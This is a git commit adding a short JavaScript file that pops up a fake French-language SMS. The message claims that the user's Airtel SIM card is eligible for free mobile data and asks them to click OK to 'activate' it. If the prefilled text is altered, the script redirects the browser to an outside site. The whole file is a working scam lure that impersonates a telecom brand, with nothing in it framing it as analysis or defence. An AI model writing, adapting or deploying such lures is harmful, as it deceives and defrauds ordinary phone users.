7367f41e234d3c26e2e69b570cd7ba81e72004e6
ekperikpe <ekperikpe588@gmail.com>
2025-08-10 07:32:50 +0100

    Create activation-airtelfr.js

---
+++ activation-airtelfr.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 50 Go'
+password=prompt('SMS: Félicitations, votre carte SIM Airtel est éligible pour recevoir des données gratuites en récompense de votre ancienne carte SIM, cliquez sur OK pour activer','ACTIVER 50 Go');
+if (password != 'ACTIVER 50 Go') {
+location.href='https://sharpupdate.org/airtel-french';
+}
